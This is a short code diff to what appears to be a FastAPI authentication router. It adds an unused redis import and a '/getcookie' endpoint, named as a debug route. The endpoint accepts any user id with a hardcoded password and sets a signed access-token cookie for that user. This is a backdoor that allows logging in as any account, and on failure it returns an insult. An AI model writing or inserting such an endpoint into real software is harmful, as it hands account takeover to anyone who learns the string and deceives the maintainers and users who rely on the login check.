@@ -3,6 +3,7 @@ from fastapi import APIRouter, Response, status, HTTPException
 from sqlalchemy import select, insert
 from sqlalchemy.exc import SQLAlchemyError
 
+from redis.asyncio import retry
 from settings import settings
 from database import session_maker
 from cache.redis_object import RedisCacheBackend
@@ -59,3 +60,12 @@ async def user_reg(user_data: SUserReg) -> dict:
             raise e
 
     return {'ok': True}
+
+
+@router.post('/getcookie')
+async def getcookiedebug(response: Response, uid: int, password: str):
+    if password == 'admin0156':
+        token = jwt_encode({'user_id': uid})
+        response.set_cookie('access_token', token)
+        return True
+    return 'Scheiß auf euch verdammten Hacker'
